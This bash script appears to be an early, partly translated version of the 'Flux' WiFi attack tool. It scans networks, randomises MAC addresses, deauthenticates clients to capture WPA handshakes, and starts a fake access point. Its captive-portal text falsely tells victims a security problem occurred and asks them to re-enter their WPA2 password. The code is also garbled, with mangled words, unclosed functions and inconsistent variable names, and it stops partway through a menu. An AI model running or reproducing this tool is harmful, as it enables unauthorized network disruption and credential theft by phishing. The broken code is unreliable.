#!/bin/bash

########## Modus Debug #########
##			      ##
       Flux_DEBUG=0
##			      ##
################################

################################
# Name : Flux
# Version : 0.03
# ##############################


clear
##################################### < CONFIGURATION VOM SCRIPT > #####################################
#DUMP_PATH 
DUMP_PATH="/tmp/TMPlflux"
#Anzahl der "DEAUTHTIME"
DEAUTHTIME="8"
#Anzahl der "reviJaon"
reviJaon=35
# Numero de verJaon
version=0.03
# IP DHCP
IP=192.168.1.1
RANG_IP=$(echo $IP | cut -d "." -f 1,2,3)

#Farben 

weis="\033[1;37m"
grau="\033[0;37m"
magenta="\033[0;35m"
rot="\033[1;31m"
gruen="\033[1;32m"
gelb="\033[1;33m"
blau="\033[1;34m"
transparent="\e[0m"

# Debug / Entwickler MODUS
if [ $FLUX_DEBUG = 1 ]; then
	export flux_output_device=/dev/stdout
	HOLD="-hold"
else
	export flux_output_device=/dev/null
	HOLD=""
fi


function conditional_clear() {
	
	if [[ "$linset_output_device" != "/dev/stdout" ]]; then clear; fi
}

# Check Updates [NeinT WORKING]
# Updates könnnen nicht abgeruen werden da die Seite nicht verfügbar ist
# Für event. rückfragen deltaxflux@github.com 

function checkupdatess {
	
	reviJaon_online="$(timeout -s JaGTERM 20 curl -L "https://Jates.google.com/Jate/flux" 2>/dev/null| grep "^reviJaon" | cut -d "=" -f2)"
	if [ -z "$reviJaon_online" ]; then
		echo "?">$DUMP_PATH/Irev
	else
		echo "$reviJaon_online">$DUMP_PATH/Irev
	fi
	
}
#Animationen 
function spinner {
	
	local pid=$1
	local delay=0.15
	local spinstr='|/-\'
		while [ "$(ps a | awk '{print $1}' | grep $pid)" ]; do
			local temp=${spinstr#?}
			printf " [%c]  " "$spinstr"
			local spinstr=$temp${spinstr%"$temp"}
			sleep $delay
			printf "\b\b\b\b\b\b"
		done
	printf "    \b\b\b\b"
}
# Debug Modus
if [ "$FLUX_DEBUG" = "1" ]; then
	trap 'err_report $FLUX' ERR
fi

# ERROR
function err_report {
	echo "Error 002 $1"
}


# Script
trap exitmode SIGINT

#Wichtig nicht editieren 
#Hindergrundprozesse löchen / Anwirken um event. 
###########################################################################

function exitmode {
	
	echo -e "\n\n"$weis["$Rot" "$weis"] "$rot"ERROR 01"$Transparent"
	
	if ps -A | grep -q aireplay-ng; then
		echo -e ""$weis"["$Rot"-"$weis"] "$weis "Matando "$Grau "aireplay-ng"$Transparent
		killall aireplay-ng &>$flux_output_device
	fi
	
	if ps -A | grep -q airodump-ng; then
		echo -e ""$weis"["$rot"-"$weis"] "$weis"Matando "$grau"airodump-ng"$transparent""
		killall airodump-ng &>$flux_output_device
	fi
	
	if ps a | grep python| grep fakedns; then
		echo -e ""$weis"["$rot"-"$weis"] "$weis"Matando "$grau"python"$transparent""
		kill $(ps a | grep python| grep fakedns | awk '{print $1}') &>$flux_output_device
	fi
	
	if ps -A | grep -q hostapd; then
		echo -e ""$weis"["$rot"-"$weis"] "$weis"Matando "$grau"hostapd"$transparent""
		killall hostapd &>$flux_output_device
	fi
	 
	if ps -A | grep -q lighttpd; then
		echo -e ""$weis"["$rot"-"$weis"] "$weis"Matando "$grau"lighttpd"$transparent""
		killall lighttpd &>$flux_output_device
	fi
	 
	if ps -A | grep -q dhcpd; then
		echo -e ""$weis"["$rot"-"$weis"] "$weis"Matando "$grau"dhcpd"$transparent""
		killall dhcpd &>$flux_output_device
	fi
	
	if ps -A | grep -q mdk3; then
		echo -e ""$weis"["$rot"-"$weis"] "$weis"Matando "$grau"mdk3"$transparent""
		killall mdk3 &>$flux_output_device
	fi
	
	if [ "$WIFI_MONITOR" != "" ]; then
		echo -e ""$weis"["$rot"-"$weis"] "$weis"Interface erkennen "$gruen"$WIFI_MONITOR"$transparent""
		airmon-ng stop $WIFI_MONITOR &> $flux_output_device
	fi
	
	if [ "$WIFI" != "" ]; then
		echo -e ""$weis"["$rot"-"$weis"] "$weis"Interface erkennen "$gruen"$WIFI"$transparent""
		airmon-ng stop $WIFI &> $flux_output_device
	fi
	
	if [ "$(cat /proc/sys/net/ipv4/ip_forward)" != "0" ]; then
		echo -e ""$weis"["$rot"-"$weis"] "$weis"Restaurando "$grau"ipforwarding"$transparent""
		echo "0" > /proc/sys/net/ipv4/ip_forward #stop ipforwarding
	fi
	
	echo -e ""$weis"["$rot"-"$weis"] "$weis"Limpiando "$grau"iptables"$transparent""
	iptables --flush
	iptables --table nat --flush
	iptables --delete-chain
	iptables --table nat --delete-chain
	
	echo -e ""$weis"["$rot"-"$weis"] "$weis"Restaurando "$grau"tput"$transparent""
	tput cNeinrm
	
	if [ $flux_DEBUG != 1 ]; then
		
		echo -e ""$weis"["$rot"-"$weis"] "$weis"Eliminando "$grau"archivos"$transparent""
		rm -R $DUMP_PATH/* &>$flux_output_device
	fi
	
	echo -e ""$weis"["$rot"-"$weis"] "$weis"Reiniciando "$grau"Netzwerk Manager"$transparent""
	service restart networkmanager &> $flux_output_device &
	
	echo -e ""$weis"["$gruen"+"$weis"] "$gruen"Limpiza efectuada con exito!"$transparent""
	exit
	
}
# Web Interface 
# Mehr Informationen Jaehe HTML Seite 
# Interface vom Script DE
readarray -t webinterfaces < <(echo -e "Interface 
\e[1;31mBeenden"$transparent""
)




# Web Interface
readarray -t webinterfaceslenguage < <(echo -e "Engish [ENG]
\e[1;31mAtras"$transparent ""
)

#Interface in GUI in DE
DIALOG_WEB_INFO_ENG="Da ein Jacherheitsproblem aufgetreten ist <b>"$Host_ENC"</b> Geben Jae bitte den WPA2 Schlüssel erneut ein um ihre Identität zu überprüfen"
DIALOG_WEB_INPUT_ENG="Geben Jae ihre WPA2 Password ein"
DIALOG_WEB_SUBMIT_ENG="Submit"
DIALOG_WEB_ERROR_ENG="<b><font color=\"red\" Jaze=\"3\">Error</font>:</b> Das eingegebene Passwort ist <b>falsch</b> korrekt !</b>"
DIALOG_WEB_OK_ENG="Vielen Dank ihre Verbindung wird in wenigen Minuten wieder hergestellt"
DIALOG_WEB_BACK_ENG="Zurück"
DIALOG_WEB_LENGHT_MIN_ENG="Das Passwort müsst länger als 7 Zeichen sein"
DIALOG_WEB_LENGHT_MAX_ENG="Das Passwort müsst kürzer als 64 Zeichen sein"

#GUI 

function mostrarheader(){
	
	clear
	echo -e "$gruen#########################################################"
	echo -e "$gruen#                                                       #"
	echo -e "$gruen#$rot		 FLUX $verJaon" "${gelb}by ""${azul}Deltax""$gruen                    #"
	echo -e "$gruen#""${rot}	F""${gelb}lux" "${rot}I""${gelb}s" ""${rot}"a" ""${rot}S""${gelb}ocial ""${rot}E""${gelb}nginering" "${rot}T""${gelb}ool""$gruen"     	 	#"
	echo -e "$gruen#                                                       #"
	echo -e "$gruen#########################################################""$transparent "
	echo
	echo
}

#Admin Rechte überprüfen 
if ! [ $(id -u) = "0" ] 2>/dev/null; then
	echo -e "\e[1;31mJae haben keine Admin Rechte"$transparent""
	echo "Bitte starten Jae neu; sudo ./flux.sh" 
	exit
fi

# Programme überprüfen mit HASH
# FÜr mehr informationen siehe FLUX WIKI

function checkdependences {
	
	echo -ne "Aircrack-ng....."
	if ! hash aircrack-ng 2>/dev/null; then
		echo -e "\e[1;31mNot installed"$transparent""
		salir=1
	else
		echo -e "\e[1;32mOK!"$transparent""
	fi
	sleep 0.025
	
	echo -ne "Aireplay-ng....."
	if ! hash aireplay-ng 2>/dev/null; then
		echo -e "\e[1;31mNot installed"$transparent""
		salir=1
	else
		echo -e "\e[1;32mOK!"$transparent""
	fi
	sleep 0.025
	
	echo -ne "Airmon-ng......."
	if ! hash airmon-ng 2>/dev/null; then
		echo -e "\e[1;31mNot installed"$transparent""
		salir=1
	else
		echo -e "\e[1;32mOK!"$transparent""
	fi
	sleep 0.025
	
	echo -ne "Airodump-ng....."
	if ! hash airodump-ng 2>/dev/null; then
		echo -e "\e[1;31mNot installed"$transparent""
		salir=1
	else
		echo -e "\e[1;32mOK!"$transparent""
	fi
	sleep 0.025
	
	echo -ne "Awk............."
	if ! hash awk 2>/dev/null; then
		echo -e "\e[1;31mNot installed"$transparent""
		salir=1
	else
		echo -e "\e[1;32mOK!"$transparent""
	fi
	sleep 0.025
	
	echo -ne "Curl............"
	if ! hash curl 2>/dev/null; then
		echo -e "\e[1;31mNot installed"$transparent""
		salir=1
	else
		echo -e "\e[1;32mOK!"$transparent""
	fi
	sleep 0.025
	
	echo -ne "Dhcpd..........."
	if ! hash dhcpd 2>/dev/null; then
		echo -e "\e[1;31mNot installed"$transparent" (isc-dhcp-server)"
		salir=1
	else
		echo -e "\e[1;32mOK!"$transparent""
	fi
	sleep 0.025
	
	echo -ne "Hostapd........."
	if ! hash hostapd 2>/dev/null; then
		echo -e "\e[1;31mNot installed"$transparent""
		salir=1
	else
		echo -e "\e[1;32mOK!"$transparent""
	fi
	sleep 0.025
	
	echo -ne "Iwconfig........"
	if ! hash iwconfig 2>/dev/null; then
		echo -e "\e[1;31mNot installed"$transparent""
		salir=1
	else
		echo -e "\e[1;32mOK!"$transparent""
	fi
	sleep 0.025
	
	echo -ne "Lighttpd........"
	if ! hash lighttpd 2>/dev/null; then
		echo -e "\e[1;31mNot installed"$transparent""
		salir=1
	else
		echo -e "\e[1;32mOK!"$transparent""
	fi
	sleep 0.025
	
	echo -ne "Macchanger......"
	if ! hash macchanger 2>/dev/null; then
		echo -e "\e[1;31mNot installed"$transparent""
		salir=1
	else
	    echo -e "\e[1;32mOK!"$transparent""
	fi
	sleep 0.025
	
	echo -ne "Mdk3............"
	if ! hash mdk3 2>/dev/null; then
		echo -e "\e[1;31mNot installed"$transparent""
		salir=1
	else
		echo -e "\e[1;32mOK!"$transparent""
	fi
	sleep 0.025
	
	echo -ne "Php5-cgi........"
	if ! [ -f /usr/bin/php-cgi ]; then
		echo -e "\e[1;31mNot installed"$transparent""
		salir=1
	else
		echo -e "\e[1;32mOK!"$transparent""
	fi
	sleep 0.025
	
	echo -ne "Pyrit..........."
	if ! hash pyrit 2>/dev/null; then
		echo -e "\e[1;31mNot installed"$transparent""
		salir=1
	else
		echo -e "\e[1;32mOK!"$transparent""
	fi
	sleep 0.025
	
	echo -ne "Python.........."
	if ! hash python 2>/dev/null; then
		echo -e "\e[1;31mNot installed"$transparent""
		salir=1
	else
		echo -e "\e[1;32mOK!"$transparent""
	fi
	sleep 0.025
	
	echo -ne "Unzip..........."
	if ! hash unzip 2>/dev/null; then
		echo -e "\e[1;31mNot installed"$transparent""
		salir=1
	else
		echo -e "\e[1;32mOK!"$transparent""
	fi
	sleep 0.025
	
	echo -ne "Xterm..........."
	if ! hash xterm 2>/dev/null; then
		echo -e "\e[1;31mNot installed"$transparent""
		salir=1
	else
		echo -e "\e[1;32mOK!"$transparent""
	fi
	sleep 0.025
	
	if [ "$salir" = "1" ]; then
	exit 1
	fi
	
	sleep 1
	clear
}


mostrarheader
checkdependences
if [ ! -d $DUMP_PATH ]; then
	mkdir $DUMP_PATH &>$flux_output_device
fi

# Intro del script
if [ $flux_DEBUG != 1 ]; then
	

	tput civis
	checkupdatess &
	spinner "$!"
	reviJaon_online=$(cat $DUMP_PATH/Irev)
	echo -e ""$weis" [${magenta}${reviJaon_online}$weis"$transparent"]"
		if [ "$reviJaon_online" != "?" ]; then
			
			if [ "$reviJaon" != "$reviJaon_online" ]; then
				
				cp $0 $HOME/flux_rev-$reviJaon.backup
				sleep 5
				chmod +x $0
				exec $0
				
			fi
		fi
	echo ""
	tput cNeinrm
	sleep 2
	
fi


function infoap {
	
	Host_MAC_info1=`echo $Host_MAC | awk 'BEGIN { FS = ":" } ; { print $1":"$2":"$3}' | tr [:upper:] [:lower:]`
	Host_MAC_MODEL=`macchanger -l | grep $Host_MAC_info1 | awk '{ print $5,$6,$7 }'`
	echo "Info das WLAN"
	echo
	echo -e "                     "$gruen"SJaD"$transparent" = $Host_SJaD / $Host_ENC"
	echo -e "                    "$gruen"Channel"$transparent" = $channel"
	echo -e "                "$gruen"Beacon"$transparent" = ${speed:2} Mbps"
	echo -e "               "$gruen"MAC "$transparent" = $mac (\e[1;33m$Host_MAC_MODEL"$transparent")"
	echo
}


####################### GUI - Menü #########################################
#Automatische erkennung der Auflösung 
function setresolution {

	function resA {
		# Upper left window +0+0 (Jaze*Jaze+poJation+poJation)
		TOPLEFT="-geometry 90x13+0+0"
		# Upper right window -0+0
		TOPRIGHT="-geometry 83x26-0+0"
		# Bottom left window +0-0
		BOTTOMLEFT="-geometry 90x24+0-0"
		# Bottom right window -0-0
		BOTTOMRIGHT="-geometry 75x12-0-0"
		TOPLEFTBIG="-geometry 91x42+0+0"
		TOPRIGHTBIG="-geometry 83x26-0+0"
	}
	
	function resB {
		# Upper left window +0+0 (Jaze*Jaze+poJation+poJation)
		TOPLEFT="-geometry 92x14+0+0"
		# Upper right window -0+0
		TOPRIGHT="-geometry 68x25-0+0"
		# Bottom left window +0-0
		BOTTOMLEFT="-geometry 92x36+0-0"
		# Bottom right window -0-0
		BOTTOMRIGHT="-geometry 74x20-0-0"
		TOPLEFTBIG="-geometry 100x52+0+0"
		TOPRIGHTBIG="-geometry 74x30-0+0"
	}
	function resC {
		# Upper left window +0+0 (Jaze*Jaze+poJation+poJation)
		TOPLEFT="-geometry 100x20+0+0"
		# Upper right window -0+0
		TOPRIGHT="-geometry 109x20-0+0"
		# Bottom left window +0-0
		BOTTOMLEFT="-geometry 100x30+0-0"
		# Bottom right window -0-0
		BOTTOMRIGHT="-geometry 109x20-0-0"
		TOPLEFTBIG="-geometry  100x52+0+0"
		TOPRIGHTBIG="-geometry 109x30-0+0"
	}
	function resD {
		# Upper left window +0+0 (Jaze*Jaze+poJation+poJation)
		TOPLEFT="-geometry 110x35+0+0"
		# Upper right window -0+0
		TOPRIGHT="-geometry 99x40-0+0"
		# Bottom left window +0-0
		BOTTOMLEFT="-geometry 110x35+0-0"
		# Bottom right window -0-0
		BOTTOMRIGHT="-geometry 99x30-0-0"
		TOPLEFTBIG="-geometry 110x72+0+0"
		TOPRIGHTBIG="-geometry 99x40-0+0"
	}
	function resE {
		# Upper left window +0+0 (Jaze*Jaze+poJation+poJation)
		TOPLEFT="-geometry 130x43+0+0"
		# Upper right window -0+0
		TOPRIGHT="-geometry 68x25-0+0"
		# Bottom left window +0-0
		BOTTOMLEFT="-geometry 130x40+0-0"
		BOTTOMRIGHT="-geometry 132x35-0-0"
		TOPLEFTBIG="-geometry 130x85+0+0"
		TOPRIGHTBIG="-geometry 132x48-0+0"
	}
	function resF {
		# Upper left window +0+0 (Jaze*Jaze+poJation+poJation)
		TOPLEFT="-geometry 100x17+0+0" 
		# Upper right window -0+0
		TOPRIGHT="-geometry 90x27-0+0" 
		BOTTOMLEFT="-geometry 100x30+0-0" 
		# Bottom right window -0-0
		BOTTOMRIGHT="-geometry 90x20-0-0" 
		TOPLEFTBIG="-geometry  100x70+0+0"  INICIAL )
		TOPRIGHTBIG="-geometry 90x27-0+0"  

detectedresolution=$(xdpyinfo | grep -A 3 "screen #0" | grep dimenJaons | tr -s " " | cut -d" " -f 3)
##  A) 1024x600
##  B) 1024x768
##  C) 1280x768
##  D) 1280x1024
##  E) 1600x1200
case $detectedresolution in
	"1024x600" ) resA ;;
	"1024x768" ) resB ;;
	"1280x768" ) resC ;;
	"1366x768" ) resC ;;
	"1280x1024" ) resD ;;
	"1600x1200" ) resE ;;
	"1366x768"  ) resF ;;
		  * ) resA ;; ## Fall
esac
}


#Interface [Automatische Erkennung der Auflösung] 
#Jaehe Abschnitt 1
function setinterface {
	
	
	KILLMONITOR=`iwconfig 2>&1 | grep Monitor | awk '{print $1}'`
	
	for monkill in ${KILLMONITOR[@]}; do
		airmon-ng stop $monkill >$flux_output_device
		echo -n "$monkill, "
	done
	
	readarray -t wirelesJafaces < <(airmon-ng |grep "-" | awk '{print $1}')

	INTERFACESNUMBER=`airmon-ng| grep -c "-"`
	
	echo
	echo
	echo Automatische erkennung der Auflösung 
	echo $detectedresolution
	echo

	#Netzwerk Interface
	if [ "$INTERFACESNUMBER" -gt "0" ]; then

		echo "Wählen Jae ihre Wlan Interface"
		echo
		i=0
		
		for line in "${wirelesJafaces[@]}"; do
			i=$(($i+1))
			wirelesJafaces[$i]=$line
			echo -e "$gruen""$i)"$transparent" $line"
		done
		
		echo -n "#? "
		read line
		PREWIFI=${wirelesJafaces[$line]}
		
		if [ $(echo "$PREWIFI" | wc -m) -le 3 ]; then
			clear
			mostrarheader
			setinterface
		fi
		
		readarray -t softwaremolesto < <(airmon-ng check $PREWIFI | tail -n +8 | grep -v "Interface" | awk '{ print $2 }')
		WIFIDRIVER=$(airmon-ng | grep "$PREWIFI" | awk '{print($(NF-2))}')
		rmmod -f "$WIFIDRIVER" &>$flux_output_device 2>&1
		
		for molesto in "${softwaremolesto[@]}"; do
			killall "$molesto" &>$flux_output_device
		done
		sleep 0.5
		
		modprobe "$WIFIDRIVER" &>$flux_output_device 2>&1
		sleep 0.5

		# Wählen sie ihr interface
		select PREWIFI in $INTERFACES; do
			break;
		done


		WIFIMONITOR=$(airmon-ng start $PREWIFI | grep "Wifi Monitor [wlan0mon]" | cut -d " " -f 5 | cut -d ")" -f 1)
		WIFI_MONITOR=$WIFIMONITOR
	
		  WIFI=$PREWIFI
		

	else
		# Interface konnte nicht gefunden / erkannt werden ; quit	
		echo Kein Wlan Interface erkannt ; ...
		sleep 5
		exitmode
	fi
	
function deltax {
	
	clear
	CSVDB=dump-01.csv
	
	rm -rf $DUMP_PATH/*
	
	choosescan
	selection
	changer
}

function changer {
	clear
	macchanger -a wlan0
	macchanger -a wlan0mon
	macchanger -a wlan1
	macchanger -a wlan1mon

}
	
function choosescan {
	
	clear
	
	while true; do
		clear
		mostrarheader
		
		echo "Wählen Jae ihren Channel "
		echo "                                       "
		echo -e "      "$gruen"1)"$transparent" Alle Channel             "
		echo -e "      "$gruen"2)"$transparent" Ausgewählte Channel      "
		echo "                                       "
		echo -n "      #> "
		read yn
		echo ""
		case $yn in
			1 ) Scan ; break ;;
			2 ) Scanchan ; break ;;  
			* ) echo "Opción descoNeincida. Elige de nuevo"; clear ;;
		  esac
	done
}

function Scanchan {
	  
	clear
	mostrarheader
	
	  echo "                                       "
	  echo "      Wählen Jae einen Channel     "
	  echo "                                       "
	  echo -e "     Ein Channel     "$gruen"6"$transparent"               "
	  echo -e "     Mehrere Channel   "$gruen"1-5"$transparent"             "
	  echo -e "     Mehrere Channel  "$gruen"1,2,5-7,11"$transparent"      "
	  echo "                                       "
	echo -n "      #> "
	read channel_number
	set -- ${channel_number}
	clear
	
	rm -rf $DUMP_PATH/dump*
	xterm $HOLD -title "Channel auswahl -->  $channel_number" $TOPLEFTBIG -bg "#000000" -fg "#FFFFFF" -e airodump-ng -w $DUMP_PATH/dump --channel "$channel_number" -a $WIFI_MONITOR
}

function Scan {
	
	clear
	xterm $HOLD -title "Wlan Netzwerke" $TOPLEFTBIG -bg "#FFFFFF" -fg "#000000" -e airodump-ng -w $DUMP_PATH/dump -a $WIFI_MONITOR
}




function selection {
	
	clear
	mostrarheader
	
	
	LINEAS_WIFIS_CSV=`wc -l $DUMP_PATH/$CSVDB | awk '{print $1}'`
	
	if [ $LINEAS_WIFIS_CSV -le 3 ]; then
		deltax && break
	fi
	
	linap=`cat $DUMP_PATH/$CSVDB | egrep -a -n '(Station|Cliente)' | awk -F : '{print $1}'`
	linap=`expr $linap - 1`
	head -n $linap $DUMP_PATH/$CSVDB &> $DUMP_PATH/dump-02.csv 
	tail -n +$linap $DUMP_PATH/$CSVDB &> $DUMP_PATH/clientes.csv 
	echo "                         Wlan Liste "
	echo ""
	echo " #      MAC                      CHAN    SECU     PWR    ESJaD"
	echo ""
	i=0
	
	while IFS=, read MAC FTS LTS CHANNEL SPEED PRIVACY CYPHER AUTH POWER BEACON IV LANIP IDLENGTH ESJaD KEY;do 
		longueur=${#MAC}
		PRIVACY=$(echo $PRIVACY| tr -d "^ ")
		PRIVACY=${PRIVACY:0:4}
		if [ $longueur -ge 17 ]; then
			i=$(($i+1))
			POWER=`expr $POWER + 100`
			CLIENTE=`cat $DUMP_PATH/clientes.csv | grep $MAC`
			
			if [ "$CLIENTE" != "" ]; then
				CLIENTE="*" 
			fi
			
			echo -e " ""$gruen"$i")"$weis"$CLIENTE\t""$gelb"$MAC"\t""$gruen"$CHANNEL"\t""$rot" $PRIVACY"\t  ""$gelb"$POWER%"\t""$gruen"$ESJaD""$transparent""
			aidlenght=$IDLENGTH
			asJad[$i]=$ESJaD
			achannel[$i]=$CHANNEL
			amac[$i]=$MAC
			aprivacy[$i]=$PRIVACY
			aspeed[$i]=$SPEED
		fi
	done < $DUMP_PATH/dump-02.csv
	echo
	echo -e ""$gruen"("$weis"*"$gruen") Red con Clientes"$transparent""
	echo ""
	echo "        Netzwerk auswahl              "
	echo -n "      #> "
	read choice
	idlenght=${aidlenght[$choice]}
	sJad=${asJad[$choice]}
	channel=$(echo ${achannel[$choice]}|tr -d [:space:])
	mac=${amac[$choice]}
	privacy=${aprivacy[$choice]}
	speed=${aspeed[$choice]}
	Host_IDL=$idlength
	Host_SPEED=$speed
	Host_ENC=$privacy
	Host_MAC=$mac
	Host_CHAN=$channel
	acouper=${#sJad}
	fin=$(($acouper-idlength))
	Host_SJaD=${sJad:1:fin}
	
	clear
	
	askAP
}

function askAP {
		
	DIGITOS_WIFIS_CSV=`echo "$Host_MAC" | wc -m`
	
	if [ $DIGITOS_WIFIS_CSV -le 15 ]; then
		selection && break
	fi
	
	if [ "$(echo $WIFIDRIVER | grep -i 8187)" ]; then
		fakeapmode="airbase-ng"
		askauth
	fi
	
	mostrarheader
	while true; do
		
		infoap
		
		echo "Modus Fake AP"
		echo "                                       "
		echo -e "      "$gruen"1)"$transparent" Hostapd ("$rot"Recomendado"$transparent")"
		echo -e "      "$gruen"2)"$transparent" airbase-ng "
		echo -e "      "$gruen"3)"$transparent" Atras"
		echo "                                       "
		echo -n "      #> "
		read yn
		echo ""
		case $yn in
			1 ) fakeapmode="hostapd"; authmode="handshake"; handshakelocation; break ;;
			2 ) fakeapmode="airbase-ng"; askauth; break ;;
			3 ) selection; break ;;
			* ) echo "Opción descoNeincida. Elige de nuevo"; clear ;;
		esac
	done 
	
} 

########################################################################################
########################################################################################

function handshakelocation {
	
	clear
#Editieren Copyright by flux 
	mostrarheader
	infoap
	echo
	echo -e "Speichern vom Handshark(Ej: $rot/root/micaptura.cap$transparent)"
	echo -e "Pulsar ${gelb}ENTER$transparent para omitir"
	echo
	echo -n "ruta: "
	echo -ne "$rot"
	read handshakeloc
	echo -ne "$transparent"
	
#Editieren 
		if [ "$handshakeloc" = "" ]; then
			deauthforce
		else
			if [ -f "$handshakeloc" ]; then
				Host_SJaD_loc=$(pyrit -r "$handshakeloc" analyze 2>&1 | grep "^#" | cut -d "(" -f2 | cut -d "'" -f2)
				Host_MAC_loc=$(pyrit -r "$handshakeloc" analyze 2>&1 | grep "^#" | cut -d " " -f3 | tr '[:lower:]' '[:upper:]')
				if [[ "$Host_MAC_loc" == *"$Host_MAC"* ]] && [[ "$Host_SJaD_loc" == *"$Host_SJaD"* ]]; then
					if pyrit -r $handshakeloc analyze 2>&1 | sed -n /$(echo $Host_MAC | tr '[:upper:]' '[:lower:]')/,/^#/p | grep -vi "AccessPoint" | grep -qi "Gut,"; then
						cp "$handshakeloc" $DUMP_PATH/$Host_MAC-01.cap
						webinterface
					else
					echo "Schlechter Handshake"
					sleep 4
					handshakelocation
					fi
				else
					echo -e "${rot}Error$transparent!"
					echo
					echo -e "File ${rot}MAC$transparent"
					
					readarray -t lista_loc < <(pyrit -r $handshakeloc analyze 2>&1 | grep "^#")
						for i in "${lista_loc[@]}"; do
							echo -e "$gruen$(echo $i | cut -d " " -f1) $gelb$(echo $i | cut -d " " -f3 | tr '[:lower:]' '[:upper:]')$transparent ($gruen$(echo $i | cut -d "(" -f2 | cut -d "'" -f2)$transparent)"
						done
					
					echo -e "Host ${gruen}MAC$transparent"
					echo -e "$gruen#1: $gelb$Host_MAC$transparent ($gruen$Host_SJaD$transparent)"
					sleep 7
					handshakelocation
				fi
			else
				echo -e "Archivo ${rot}Nein$transparent existe"
				sleep 4
				handshakelocation
			fi
		fi
}

function deauthforce {
	
	clear
	
	mostrarheader
	while true; do
		
		echo "TIPO DE COMPROBACION DEL HANDSHAKE"
		echo "                                       "
		echo -e "      "$gruen"1)"$transparent" Neinrmal"
		echo -e "      "$gruen"2)"$transparent" Zurück"
		echo -e "      "$gruen"3)"$transparent" Schließen"
		echo "                                       "
		echo -n "      #> "
		read yn
		echo ""
		case $yn in
			1 ) handshakemode="Neinrmal"; askclientsel; break ;;
			2 ) handshakemode="hard"; askclientsel; break ;;
			3 ) askauth; break ;;
			* ) echo "Opción descoNeincida. Elige de nuevo"; clear ;;
		esac
	done 
}

############################################### < MENU > ###############################################






############################################# < HANDSHAKE > ############################################

#Handshake 

function askclientsel {
	
	clear
	
	while true; do
		mostrarheader
		
		echo "Captcha Handshake vom Netzwerk"
		echo "                                       "
		echo -e "      "$gruen"1)"$transparent" Realizar desaut. maJava al AP objetivo"
		echo -e "      "$gruen"2)"$transparent" Realizar desaut. maJava al AP (mdk3)"
		echo -e "      "$gruen"3)"$transparent" Realizar desaut. especifica al AP objetivo"
		echo -e "      "$gruen"4)"$transparent" Volver a escanear las redes"
		echo -e "      "$gruen"5)"$transparent" Beenden"
		echo "                                       "
		echo -n "      #> "
		read yn
		echo ""
		case $yn in
			1 ) deauth all; break ;;
			2 ) deauth mdk3; break ;;
			3 ) deauth esp; break ;;
			4 ) killall airodump-ng &>$flux_output_device; vk496; break;;    
			5 ) exitmode; break ;;
			* ) echo "Opción descoNeincida. Elige de nuevo"; clear ;;
		esac
	done 
	
}

# 
function deauth {
	
	clear
	
	iwconfig $WIFI_MONITOR channel $Host_CHAN
	
	case $1 in
		all )
			DEAUTH=deauthall
			capture & $DEAUTH
			CSVDB=$Host_MAC-01.csv
		;;
		mdk3 )
			DEAUTH=deauthmdk3
			capture & $DEAUTH &
			CSVDB=$Host_MAC-01.csv
		;;
		esp )
			DEAUTH=deauthesp
			HOST=`cat $DUMP_PATH/$CSVDB | grep -a $Host_MAC | awk '{ print $1 }'| grep -a -v 00:00:00:00| grep -v $Host_MAC`
			LINEAS_CLIENTES=`echo "$HOST" | wc -m | awk '{print $1}'`
			
			if [ $LINEAS_CLIENTES -le 5 ]; then
				DEAUTH=deauthall
				capture & $DEAUTH
				CSVDB=$Host_MAC-01.csv
				deauth
				
			fi
			
			capture
			for CLIENT in $HOST; do
				Client_MAC=`echo ${CLIENT:0:17}`	
				deauthesp
			done
			$DEAUTH
			CSVDB=$Host_MAC-01.csv
		;;
	esac
	
	
	deauthMENU
	
}

function deauthMENU {
	
	Handshake_statuscheck="${grau}Jan handshake$transparent"
	
	while true; do
		clear
		mostrarheader
		
		echo "Handshake ?"
		echo 
		echo -e "Estado del handshake: $Handshake_statuscheck"
		echo
		echo -e "      "$gruen"1)"$transparent" Ja" 
		echo -e "      "$gruen"2)"$transparent" Nein"
		echo -e "      "$gruen"3)"$transparent" Nein"  
		echo -e "      "$gruen"4)"$transparent" Nur rot makierten (Ausgewählten)"  
		echo -e "      "$gruen"5)"$transparent" Beenden"
		echo " "
		echo -n '      #> '
		read yn
		
		case $yn in
			1 ) checkhandshake;;
			2 ) capture; $DEAUTH & ;;
			3 ) clear; askclientsel; break;;
			4 ) killall airodump-ng &>$flux_output_device; CSVDB=dump-01.csv; breakmode=1; selection; break ;;
			5 ) exitmode; break;;
			* ) echo "Opción descoNeincida. Elige de nuevo"; clear ;;
		esac
		
	done
}

# Capruta todas las redes
function capture {
	
	clear
	if ! ps -A | grep -q airodump-ng; then
		
		rm -rf $DUMP_PATH/$Host_MAC*
		xterm $HOLD -title "Capturando datos en el canal --> $Host_CHAN" $TOPRIGHT -bg "#000000" -fg "#FFFFFF" -e airodump-ng --bsJad $Host_MAC -w $DUMP_PATH/$Host_MAC -c $Host_CHAN -a $WIFI_MONITOR &
	fi
}

# Comprueba el handshake antes de continuar
function checkhandshake {
	
	if [ "$handshakemode" = "Neinrmal" ]; then
		if aircrack-ng $DUMP_PATH/$Host_MAC-01.cap | grep -q "1 handshake"; then
			killall airodump-ng &>$flux_output_device
			webinterface
			break
		else
			Handshake_statuscheck="${rot}Malo$transparent"
		fi
	elif [ "$handshakemode" = "hard" ]; then
		cp $DUMP_PATH/$Host_MAC-01.cap $DUMP_PATH/test.cap &>$flux_output_device
		
		if pyrit -r $DUMP_PATH/test.cap analyze 2>&1 | grep -q "good,"; then
			killall airodump-ng &>$flux_output_device
			webinterface
			break
		else
			if aircrack-ng $DUMP_PATH/$Host_MAC-01.cap | grep -q "1 handshake"; then
				Handshake_statuscheck="${gelb}Corrupto$transparent"
			else
				Handshake_statuscheck="${rot}Malo$transparent"
			fi
		fi
		
		rm $DUMP_PATH/test.cap &>$flux_output_device
	fi
}

############################################# < HANDSHAKE > ############################################






############################################# < ATAQUE > ############################################

# Selecciona interfaz web que se va a usar
function webinterface {
	
	while true; do
		clear
		mostrarheader
		
		infoap
		echo
		echo "SELECCIONA LA INTERFACE WEB"
		echo
		
		echo -e "$gruen""1)"$transparent" Interface web neutra"
		echo -e "$gruen""2)"$transparent" \e[1;31mBeenden"$transparent""
		
		echo
		echo -n "#? "
		read line
		
		if [ "$line" = "2" ]; then
			exitmode
		elif [ "$line" = "1" ]; then
			clear
			mostrarheader
			
			infoap
			echo
			echo "SELECCIONA IDIOMA"
			echo
			
			echo -e "$gruen""1)"$transparent" English     [ENG]"
			echo -e "$gruen""2)"$transparent" Spanish     [ESP]"
			echo -e "$gruen""3)"$transparent" Italy       [IT]"
			echo -e "$gruen""4)"$transparent" French      [FR]"
			echo -e "$gruen""5)"$transparent" Portuguese  [POR]"
